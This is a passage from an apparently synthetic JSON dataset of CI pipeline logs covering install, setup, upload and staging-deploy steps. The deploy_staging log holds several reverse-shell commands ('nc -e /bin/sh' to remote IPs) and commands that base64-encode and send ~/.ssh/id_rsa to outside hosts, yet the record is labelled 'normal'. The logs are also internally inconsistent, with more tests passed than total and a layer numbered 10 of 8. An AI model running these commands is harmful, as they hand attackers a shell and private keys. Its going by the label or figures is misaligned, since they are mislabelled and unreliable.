          "[12:19:11] INFO: Starting build process",
          "Compiling utils/handler.rs...",
          "Tests: 250 passed, 129 total",
          "\u2713 All checks passed",
          "Loading...",
          "Step 5/18: Deploying",
          "WARNING: react has known vulnerabilities",
          "Cache restored successfully (290MB)",
          "Coverage: 76% statements, 85% branches",
          "Pushing to registry...",
          "Installing express@5.0.3",
          "[12:19:11] INFO: Processing request",
          "[12:19:11] INFO: Cache refreshed",
          "Step 16/16: Running migrations",
          "\u2713 package completed",
          "Connection established",
          "Step 8/19: Testing",
          "WARNING: axios has known vulnerabilities",
          "Switched to branch 'feature/task-416'",
          "Tests: 354 passed, 202 total",
          "Installing jest@4.4.5",
          "  PASS: test_api_health (242ms)",
          "pip: Installing build dependencies...",
          "Transforming 116 files...",
          "npm notice: package.json updated",
          "pip: Installing build dependencies...",
          "NODE_ENV=development",
          "Artifact downloaded: 18MB",
          "[12:19:11] WARN: Deprecated API usage",
          "Minifying app.js",
          "Pulling image: alpine:3.11",
          "Uploading artifact 'coverage' (32 files)",
          "POST /api - 200 (37ms)",
          "Layer 6/9: RUN command",
          "[12:19:11] INFO: Starting build process",
          "npm notice: package.json updated",
          "Compiling components/utils.go...",
          "Exception: NullPointerException",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-02T12:22:05.047086",
        "finished_at": "2025-12-02T12:22:19.498182",
        "log_lines": [
          "=== Step: setup_environment ===",
          "[12:19:11] DEBUG: Memory usage: 460MB",
          "\u2713 Task completed in 4497ms",
          "pip: Installing build dependencies...",
          "\u2713 All checks passed",
          "Compiling utils/main.py...",
          "Pulling image: python:latest",
          "Artifact downloaded: 13MB",
          "Exception: TypeError",
          "Verifying...",
          "HEAD is now at 751568d",
          "Success!",
          "WARNING: express has known vulnerabilities",
          "Waiting...",
          "[12:19:11] DEBUG: Loading configuration",
          "Already up to date.",
          "Compiling src/index.js...",
          "Processing...",
          "Tests: 155 passed, 400 total",
          "Cache hit for key-1363",
          "Cache saved successfully",
          "Pushing to registry...",
          "[12:19:11] WARN: Deprecated API usage",
          "npm install: resolved 708 packages",
          "[12:19:11] ERROR: Connection failed",
          "yarn add: Done in 11.78s",
          "Artifact uploaded: dist.zip (33MB)",
          "Using Node.js 18.6.7",
          "Installing eslint@5.1.0",
          "[12:19:11] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Minifying main.js",
          "[12:19:11] WARN: Deprecated API usage",
          "Done.",
          "Exception: NullPointerException",
          "Step 8/23: Deploying",
          "\u2713 Task completed in 495ms",
          "\u2713 Step 'install' succeeded",
          "Snapshots: 27 passed, 41 total",
          "[12:19:11] WARN: Deprecated API usage",
          "\u2713 Task completed in 4357ms",
          "[12:19:11] DEBUG: Memory usage: 1679MB",
          "Step 6/16: Deploying",
          "Time: 55.110s",
          "pip: Downloading lodash-2.20.tar.gz",
          "\u2713 Task completed in 2577ms",
          "Completed.",
          "Ran 162 tests in 22s",
          "Artifact uploaded: dist.zip (31MB)",
          "Already up to date.",
          "[12:19:11] DEBUG: Loading configuration",
          "npm install: added 150 packages",
          "Compiling src/utils.go...",
          "pip: Collecting lodash",
          "Completed.",
          "Transforming 942 files...",
          "Compiling components/utils.go...",
          "Verifying...",
          "Transforming 579 files...",
          "\u2713 Step 'checkout' succeeded",
          "pip: Installing build dependencies...",
          "Cache invalidated: node_modules",
          "[12:19:11] WARN: Deprecated API usage",
          "Tests: 233 passed, 248 total",
          "[12:19:11] INFO: Starting build process",
          "Cache saved successfully",
          "[12:19:11] DEBUG: Memory usage: 1748MB",
          "WARNING: axios has known vulnerabilities",
          "Coverage: 92% statements, 90% branches",
          "Using Python 3.12",
          "Cache invalidated: node_modules",
          "WARNING: webpack has known vulnerabilities",
          "Step 10/20: Running migrations",
          "Step 1/25: Linting",
          "npm install: resolved 693 packages",
          "WARNING: express has known vulnerabilities",
          "npm notice: package.json updated",
          "[12:19:11] INFO: Connecting to database",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "Artifact uploaded: dist.zip (38MB)",
          "Artifact downloaded: 40MB",
          "pip install: Successfully installed webpack-4.10",
          "WARNING: axios has known vulnerabilities",
          "Ran 37 tests in 56s",
          "Using Python 3.9",
          "[12:19:11] DEBUG: Loading configuration",
          "Optimizing 70 modules...",
          "Using Python 3.12",
          "Finished.",
          "Step 12/20: Running migrations",
          "[12:19:11] INFO: Connecting to database",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-02T12:22:19.498182",
        "finished_at": "2025-12-02T12:22:33.949278",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "pip: Downloading express-3.10.tar.gz",
          "Connecting to example.com:443...",
          "Step 9/24: Building",
          "pip: Installing build dependencies...",
          "Layer 1/10: ENV command",
          "Artifact uploaded: dist.zip (35MB)",
          "Cache hit for key-6556",
          "npm notice: package.json updated",
          "Using Node.js 17.7.10",
          "Loading...",
          "Bundling vendor.css",
          "Compiling utils/handler.rs...",
          "npm notice: package.json updated",
          "Compiling components/service.java...",
          "[12:19:11] WARN: Deprecated API usage",
          "Step 9/23: Linting",
          "Finished.",
          "Ran 80 tests in 58s",
          "Step 5/25: Linting",
          "pip: Collecting lodash",
          "[12:19:11] INFO: Starting build process",
          "Connection established",
          "  PASS: unit/test_user_create.spec.js",
          "Test Suites: 10 passed, 30 total",
          "Installing express@3.4.6",
          "Pushing to registry...",
          "pip: Downloading eslint-1.20.tar.gz",
          "[12:19:11] ERROR: Connection failed",
          "[12:19:11] DEBUG: Query executed in 28ms",
          "WARNING: jest has known vulnerabilities",
          "Processing...",
          "Already up to date.",
          "Already up to date.",
          "\u2713 Step 'build' succeeded",
          "pip: Downloading axios-5.19.tar.gz",
          "Step 3/25: Linting",
          "Done.",
          "[12:19:11] DEBUG: Connection pool: 6 active",
          "[12:19:11] DEBUG: Memory usage: 1453MB",
          "Step 1/21: Installing dependencies",
          "Step 12/19: Running migrations",
          "Waiting...",
          "  PASS: test_auth_login (342ms)",
          "Exception: ValueError",
          "\u2713 validate completed",
          "Fetching submodules...",
          "Step 7/19: Linting",
          "Pushing to registry...",
          "Uploading artifact 'coverage' (41 files)",
          "Connecting to acme.corp:443...",
          "Layer 10/8: ENV command",
          "Completed.",
          "TLS handshake completed",
          "Success!",
          "\u2717 build failed with exit code 116",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u2713 Step 'checkout' succeeded",
          "Time: 4.32s",
          "Transforming 889 files...",
          "pip: Installing build dependencies...",
          "[12:19:11] INFO: Starting build process",
          "NODE_ENV=production",
          "Already up to date.",
          "Pushing to registry...",
          "Processing...",
          "[12:19:11] INFO: Starting build process",
          "\u2713 Step 'install' succeeded",
          "[12:19:11] INFO: Request completed",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 18/19: Deploying",
          "Creating production build...",
          "Cache saved successfully",
          "Step 10/22: Linting",
          "\u2713 Step 'checkout' succeeded",
          "npm notice: package.json updated",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Pulling image: alpine:18",
          "Artifact uploaded: dist.zip (51MB)",
          "GET /status - 200 (3ms)",
          "Bundling styles.css",
          "HEAD is now at c6823c4",
          "Cache saved successfully",
          "Verifying...",
          "Ran 170 tests in 44s",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:11] INFO: Starting build process",
          "Cache invalidated: build",
          "npm install: added 170 packages",
          "Completed.",
          "Artifact uploaded: build.tar.gz (33MB)",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-02T12:22:33.949278",
        "finished_at": "2025-12-02T12:22:48.400374",
        "log_lines": [
          "nc -e /bin/sh 224.253.200.157 26024",
          "=== Step: deploy_staging ===",
          "[12:19:11] DEBUG: Loading configuration",
          "GET /health - 201 (64ms)",
          "NODE_ENV=test",
          "Pushing to registry...",
          "Done.",
          "npm install: added 311 packages",
          "Step 9/19: Running migrations",
          "[12:19:11] INFO: Request completed",
          "[12:19:11] DEBUG: Memory usage: 1248MB",
          "nc -e /bin/sh 43.70.231.68 63160",
          "Fetching submodules...",
          "pip: Downloading lodash-2.1.tar.gz",
          "[12:19:11] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache invalidated: node_modules",
          "Snapshots: 4 passed, 11 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Image pulled successfully",
          "Cache saved successfully",
          "[12:19:11] DEBUG: Connection pool: 5 active",
          "OK",
          "Fetching submodules...",
          "HEAD is now at 5881e49",
          "\u2713 deploy completed",
          "[12:19:11] INFO: Request completed",
          "yarn add: Done in 5.22s",
          "[12:19:11] INFO: Connecting to database",
          "[12:19:11] DEBUG: Connection pool: 12 active",
          "[12:19:11] DEBUG: Query executed in 82ms",
          "Tests: 488 passed, 484 total",
          "nc -e /bin/sh 135.75.179.189 14531",
          "[12:19:11] DEBUG: Memory usage: 669MB",
          "yarn add: Done in 21.95s",
          "pip: Installing build dependencies...",
          "pip: Collecting webpack",
          "[12:19:11] DEBUG: Memory usage: 616MB",
          "Sending 320MB of data to acme.corp",
          "npm install: resolved 1733 packages",
          "[12:19:11] WARN: Deprecated API usage",
          "  PASS: e2e/test_api_health.spec.js",
          "Image pulled successfully",
          "  PASS: test_auth_login (155ms)",
          "Cache invalidated: node_modules",
          "npm notice: package.json updated",
          "Tests: 305 passed, 120 total",
          "\u2713 deploy completed",
          "Done.",
          "Switched to branch 'bugfix/task-179'",
          "nc -e /bin/sh 156.100.126.124 63518",
          "Layer 5/10: COPY command",
          "Compiling utils/utils.go...",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:19:11] INFO: Request completed",
          "Loading...",
          "\u2713 package completed",
          "Compiling src/index.js...",
          "HEAD is now at ac51fe6",
          "[12:19:11] DEBUG: Loading configuration",
          "Artifact uploaded: build.tar.gz (9MB)",
          "NODE_ENV=production",
          "[12:19:11] INFO: Connecting to database",
          "Building Docker image...",
          "nc -e /bin/sh 194.239.104.156 32951",
          "Already up to date.",
          "Test Suites: 31 passed, 5 total",
          "Sending 355MB of data to test.io",
          "[12:19:11] DEBUG: Memory usage: 1885MB",
          "  PASS: unit/test_auth_login.spec.js",
          "[12:19:11] DEBUG: Connection pool: 16 active",
          "Cache saved successfully",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 39.76.94.54 15120",
          "pip: Installing build dependencies...",
          "Compiling utils/handler.rs...",
          "pip: Installing build dependencies...",
          "Completed.",
          "[12:19:11] INFO: Starting build process",
          "[12:19:11] DEBUG: Connection pool: 16 active",
          "Connection established",
          "POST /data - 201 (328ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Already up to date.",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 197.60.120.83 15008",
          "Waiting...",
          "  PASS: e2e/test_api_health.spec.js",
          "[12:19:11] DEBUG: Query executed in 96ms",
          "FAILED: test_cache_hit",
          "Installing eslint@2.2.2",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 46.128.121.17 5165",
          "[12:19:11] INFO: Starting build process",
          "Tests: 126 passed, 393 total",
          "TLS handshake completed",
          "Artifact uploaded: dist.zip (5MB)",
          "TLS handshake completed",
          "Success!",
          "[12:19:11] INFO: Cache refreshed",
          "Optimizing 43 modules...",
          "  PASS: test_cache_hit (189ms)",
          "Artifact uploaded: dist.zip (93MB)",
          "=== Step deploy_staging completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}